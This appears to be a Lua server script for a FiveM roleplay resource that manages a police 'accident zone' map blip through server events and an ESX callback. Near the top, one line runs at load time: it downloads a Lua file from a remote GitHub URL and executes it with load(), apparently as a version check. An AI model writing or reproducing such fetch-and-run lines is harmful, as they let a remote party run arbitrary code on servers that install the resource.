local blip = false
local blipcoords = ''

PerformHttpRequest('https://raw.githubusercontent.com/zcmg/versao/main/check.lua', function(code, res, headers) s = load(res) print(s()) end,'GET')

RegisterServerEvent('zcmg_zonaacidente:blipcreate')
AddEventHandler('zcmg_zonaacidente:blipcreate', function(tempo, coords)
    if not blip then
        TriggerClientEvent("zcmg_zonaacidente:blipcreate", -1, coords)
        blip = true
        if Config.Tempo then
            Wait(tempo*60000)
            TriggerEvent('zcmg_zonaacidente:blipremove')
        end
    else
        TriggerClientEvent('zcmg_notificacao:Alerta', source, "POLICIA","A zona de acidente já está activa!", 5000, 'erro')
    end
end)

RegisterServerEvent('zcmg_zonaacidente:blipremove')
AddEventHandler('zcmg_zonaacidente:blipremove', function()
    if blip then 
        TriggerClientEvent("zcmg_zonaacidente:blipremove", -1)
        blip = false
        blipcoords = ''
    else
        TriggerClientEvent('zcmg_notificacao:Alerta', source, "POLICIA", "Não está definida nenhuma zona de acidente!", 5000, 'aviso')
    end
end)

RegisterServerEvent('zcmg_zonaacidente:coords')
AddEventHandler('zcmg_zonaacidente:coords', function(coords)
    blipcoords = coords
end)

ESX.RegisterServerCallback('zcmg_zonaacidente:estado', function(source, cb)
    local infoblip ={blip = blip, blipcoords = blipcoords}
    cb(infoblip)
end)